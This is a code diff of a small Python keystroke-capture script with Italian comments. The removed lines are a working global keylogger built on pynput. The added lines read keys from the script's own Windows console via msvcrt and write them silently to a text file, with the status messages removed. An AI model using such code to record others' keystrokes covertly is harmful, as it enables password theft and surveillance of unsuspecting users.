@@ -1,40 +1,29 @@
 import sys
 import time
-from pynput import keyboard
+import msvcrt # Libreria specifica per Windows per catturare i tasti
 
 def main():
     if len(sys.argv) != 2:
-        print(f"Usage: {sys.argv[0]} <seconds>", file=sys.stderr)
         sys.exit(1)
-
+    
     duration = int(sys.argv[1])
     logged = []
-
-    # Funzione chiamata ad ogni pressione di tasto
-    def on_press(key):
-        try:
-            # Tasti alfanumerici
-            logged.append(key.char)
-        except AttributeError:
-            # Tasti speciali (Space, Enter, etc.)
-            if key == keyboard.Key.space:
-                logged.append(" ")
-            elif key == keyboard.Key.enter:
-                logged.append("\n")
-            else:
-                logged.append(f"[{key}]")
-
-    # Avvia il listener in background
-    listener = keyboard.Listener(on_press=on_press)
-    listener.start()
-
-    print(f"--- Monitoraggio globale attivo per {duration} secondi ---")
-    time.sleep(duration)
     
-    listener.stop()
+    start = time.time()
+    # Ciclo di cattura
+    while time.time() - start < duration:
+        if msvcrt.kbhit(): # Controlla se un tasto è stato premuto
+            char = msvcrt.getch() # Legge il tasto (restituisce bytes)
+            # Decodifica il carattere e lo aggiunge alla lista
+            try:
+                logged.append(char.decode('utf-8'))
+            except:
+                logged.append(str(char))
+        time.sleep(0.01) # Riduce il carico sulla CPU
     
-    print("\n--- Log globale acquisito: ---")
-    print(''.join(filter(None, logged)))
+    # Scrittura su file
+    with open("C:\\Python311\\test.txt", "w") as f:
+        f.write(''.join(logged))
 
 if __name__ == "__main__":
     main()
